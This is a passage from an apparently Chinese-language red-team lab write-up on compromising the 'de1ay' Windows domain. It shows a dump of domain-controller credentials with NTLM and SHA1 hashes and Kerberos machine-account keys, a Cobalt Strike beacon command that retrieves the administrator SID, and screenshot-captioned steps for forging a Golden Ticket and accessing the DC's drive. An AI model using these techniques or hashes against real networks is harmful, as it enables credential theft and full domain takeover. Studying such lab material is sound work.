	 * Password : 2d 52 47 ff a5 15 08 f9 10 c0 8d 6d c8 28 cf cb 92 98 78 15 d5 12 42 9b f0 d5 e8 7a 58 cb 73 b8 de ad 2a 18 ca 62 0a 03 99 25 4c a1 46 42 26 b6 44 c7 84 d5 23 46 86 6d 1b 75 f7 1d 28 72 bf a6 6e 92 dd 9d e7 12 37 a0 65 b9 d6 e1 bb 29 4f bd f3 4b 80 fd 39 ec 10 21 30 43 01 33 88 03 ae 79 6b 59 a3 58 bd 06 21 8e fb 51 29 8c 8c f4 da 10 0f b5 bd 63 14 fd a6 14 8b f4 0a 15 f8 d9 d9 02 98 a4 cb af 89 3e 6d 49 f4 cf 53 25 74 61 ae 8d 16 74 33 12 d7 91 bc 5e 54 35 88 a6 1d e0 f4 0d 49 87 c1 af 94 2f 53 e3 92 43 89 ee 68 ce 06 bf 8b 0d ce 47 ec db 51 68 16 26 b3 ba 31 89 a5 59 3f 3e b8 57 02 c8 a1 80 e0 e9 af a0 4a a3 99 53 8e ec 3c 04 e3 3d a8 ea c1 aa c8 f3 e5 13 5d 4c c1 a6 f9 1d 14 74 63 e9 60 c1 5f 56 55 6a d0 0c 
	ssp :	KO
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DC$
Domain            : DE1AY
Logon Server      : (null)
Logon Time        : 2025/8/21 19:35:39
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : DC$
	 * Domain   : DE1AY
	 * NTLM     : 199cdf7694740292f436cc51b09f9355
	 * SHA1     : 2e173066a861825d5dc67a4a7a57c696a7c14f7d
	tspkg :	
	wdigest :	
	 * Username : DC$
	 * Domain   : DE1AY
	 * Password : (null)
	kerberos :	
	 * Username : dc$
	 * Domain   : de1ay.com
	 * Password : 2d 52 47 ff a5 15 08 f9 10 c0 8d 6d c8 28 cf cb 92 98 78 15 d5 12 42 9b f0 d5 e8 7a 58 cb 73 b8 de ad 2a 18 ca 62 0a 03 99 25 4c a1 46 42 26 b6 44 c7 84 d5 23 46 86 6d 1b 75 f7 1d 28 72 bf a6 6e 92 dd 9d e7 12 37 a0 65 b9 d6 e1 bb 29 4f bd f3 4b 80 fd 39 ec 10 21 30 43 01 33 88 03 ae 79 6b 59 a3 58 bd 06 21 8e fb 51 29 8c 8c f4 da 10 0f b5 bd 63 14 fd a6 14 8b f4 0a 15 f8 d9 d9 02 98 a4 cb af 89 3e 6d 49 f4 cf 53 25 74 61 ae 8d 16 74 33 12 d7 91 bc 5e 54 35 88 a6 1d e0 f4 0d 49 87 c1 af 94 2f 53 e3 92 43 89 ee 68 ce 06 bf 8b 0d ce 47 ec db 51 68 16 26 b3 ba 31 89 a5 59 3f 3e b8 57 02 c8 a1 80 e0 e9 af a0 4a a3 99 53 8e ec 3c 04 e3 3d a8 ea c1 aa c8 f3 e5 13 5d 4c c1 a6 f9 1d 14 74 63 e9 60 c1 5f 56 55 6a d0 0c 
	ssp :	KO
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2025/8/21 19:35:39
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	KO
	credman :	

Authentication Id : 0 ; 76853 (00000000:00012c35)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2025/8/21 19:35:39
SID               : S-1-5-90-1
	msv :	
	 [00000003] Primary
	 * Username : DC$
	 * Domain   : DE1AY
	 * NTLM     : f4279db634f00ca3f5777e0b854547ec
	 * SHA1     : cba60160e129a91eece1c9dea521671bb7edb688
	tspkg :	
	wdigest :	
	 * Username : DC$
	 * Domain   : DE1AY
	 * Password : (null)
	kerberos :	
	 * Username : DC$
	 * Domain   : de1ay.com
	 * Password : 5c 94 06 ab 7a 40 8e b2 34 66 7f 28 25 ed 49 d6 19 b9 83 99 dc 9f 5f 1d 9f 65 58 d4 f1 42 a8 6c 41 56 0e 22 1d ff c2 33 12 64 ac 33 c2 71 d8 80 62 09 2e 43 e2 fb 52 e1 b9 1a f8 b3 c5 84 f9 f9 ab 60 0f 6b 6f 86 57 b6 9f 12 c0 9c d4 33 8d bd a3 80 d5 de 59 80 2e d5 aa 65 fa 30 89 15 02 af 35 d1 a6 1b cb 28 19 49 77 44 b9 a0 67 e1 8f e6 63 74 8b 58 51 32 8b 88 6c 63 e9 22 76 3d d0 b3 b1 d1 00 c3 38 a1 8a 66 59 6d 48 55 32 19 0f 8c 5c 3d c0 de 72 bd 89 bb 11 41 6f be 15 9d 41 8f a2 9d be f1 90 52 1e 66 4f cf e8 5c 47 a8 96 06 2b 3a d1 5c ff c4 e9 77 0f 30 b4 2f 59 9f fc 21 79 22 06 c0 53 b3 9f 14 72 66 75 7c c4 3e a8 f9 be 8b 08 8c b0 d3 a0 6b da b9 d9 59 ae af f4 03 f4 18 76 d0 c9 bc 58 d1 42 d6 a9 5d a3 ae 84 81 
	ssp :	KO
	credman :	

Authentication Id : 0 ; 48427 (00000000:0000bd2b)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2025/8/21 19:35:38
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : DC$
	 * Domain   : DE1AY
	 * NTLM     : 199cdf7694740292f436cc51b09f9355
	 * SHA1     : 2e173066a861825d5dc67a4a7a57c696a7c14f7d
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	KO
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DC$
Domain            : DE1AY
Logon Server      : (null)
Logon Time        : 2025/8/21 19:35:38
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : DC$
	 * Domain   : DE1AY
	 * Password : (null)
	kerberos :	
	 * Username : dc$
	 * Domain   : DE1AY.COM
	 * Password : (null)
	ssp :	KO
	credman :	
```
### 获取域控sid
```shell
beacon> shell wmic useraccount where name="administrator" get sid
[*] Tasked beacon to run: wmic useraccount where name="administrator" get sid
[+] host called home, sent: 82 bytes
[+] received output:
SID                                            


S-1-5-21-2756371121-2868759905-3853650604-500  
```

### 制作金票据 -> 右键access->Golden Ticket
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250821202322780.png)

### 成功创建Golden Ticket
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250821202410292.png)

### 访问域控DC的c盘
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250821202831105.png)
